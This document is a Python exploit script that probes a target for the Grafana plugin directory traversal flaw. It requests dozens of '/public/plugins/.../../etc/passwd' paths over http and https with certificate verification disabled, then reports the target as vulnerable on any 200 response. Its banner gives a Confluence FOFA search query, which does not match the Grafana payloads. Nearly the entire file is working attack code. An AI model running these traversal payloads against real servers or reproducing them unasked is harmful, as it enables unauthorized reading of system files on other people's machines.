# !/usr/bin/env python3
# _*_ coding:utf-8 _*_

import re
import sys
import argparse
import requests

from requests.packages.urllib3.exceptions import InsecureRequestWarning

plugin_list = [
    '/public/plugins/alertlist/../../../../../../../../etc/passwd',
    '/public/plugins/annolist/../../../../../../../../etc/passwd',
    '/public/plugins/barchart/../../../../../../../../etc/passwd',
    '/public/plugins/cloudwatch/../../../../../../../../etc/passwd',
    '/public/plugins/dashlist/../../../../../../../../etc/passwd',
    '/public/plugins/elasticsearch/../../../../../../../../etc/passwd',
    '/public/plugins/graph/../../../../../../../../etc/passwd',
    '/public/plugins/graphite/../../../../../../../../etc/passwd',
    '/public/plugins/heatmap/../../../../../../../../etc/passwd',
    '/public/plugins/influxdb/../../../../../../../../etc/passwd',
    '/public/plugins/mysql/../../../../../../../../etc/passwd',
    '/public/plugins/opentsdb/../../../../../../../../etc/passwd',
    '/public/plugins/pluginlist/../../../../../../../../etc/passwd',
    '/public/plugins/postgres/../../../../../../../../etc/passwd',
    '/public/plugins/prometheus/../../../../../../../../etc/passwd',
    '/public/plugins/stackdriver/../../../../../../../../etc/passwd',
    '/public/plugins/table/../../../../../../../../etc/passwd',
    '/public/plugins/text/../../../../../../../../etc/passwd',
    '/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd',
    '/public/plugins/bargauge/../../../../../../../../etc/passwd',
    '/public/plugins/gettingstarted/../../../../../../../../../../../../../../../etc/passwd',
    '/public/plugins/gauge/../../../../../../../../etc/passwd',
    '/public/plugins/geomap/../../../../../../../../etc/passwd',
    '/public/plugins/gettingstarted/../../../../../../../../etc/passwd',
    '/public/plugins/histogram/../../../../../../../../etc/passwd',
    '/public/plugins/jaeger/../../../../../../../../etc/passwd',
    '/public/plugins/logs/../../../../../../../../etc/passwd',
    '/public/plugins/loki/../../../../../../../../etc/passwd',
    '/public/plugins/mssql/../../../../../../../../etc/passwd',
    '/public/plugins/news/../../../../../../../../etc/passwd',
    '/public/plugins/nodeGraph/../../../../../../../../etc/passwd',
    '/public/plugins/piechart/../../../../../../../../etc/passwd',
    '/public/plugins/stat/../../../../../../../../etc/passwd',
    '/public/plugins/state-timeline/../../../../../../../../etc/passwd',
    '/public/plugins/status-history/../../../../../../../../etc/passwd',
    '/public/plugins/table-old/../../../../../../../../etc/passwd',
    '/public/plugins/tempo/../../../../../../../../etc/passwd',
    '/public/plugins/testdata/../../../../../../../../etc/passwd',
    '/public/plugins/timeseries/../../../../../../../../etc/passwd',
    '/public/plugins/welcome/../../../../../../../../etc/passwd',
    '/public/plugins/zipkin/../../../../../../../../etc/passwd',
]

def title():
    print('+          FOFA:app="ATLASSIAN-Confluence"')

def run_proto(url):
    for i in plugin_list:
        check_url = url + i
        print(check_url)
        headers = {
            'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'
        }
        try:
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            response = requests.get(url=check_url, headers=headers,  verify=False, timeout=(3, 3), allow_redirects=False)
            # re_compare = re.search('.*?:.*?:.*?/.*?bin', response.text, re.I)
            if response.status_code == 200:
                print(url + 'Exist')
                return True
            else:
                continue
        except Exception as e:
            print(e)
            continue
    return False
def run(target):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}'.format(proto[i], target)
        if run_proto(url):
            return True
        else:
            i = i + 1

if __name__ == '__main__':
    title()
    target = sys.argv[1]

    result = run(target)

    if result:
        print('Exist')
    else:
        print('UnExist')

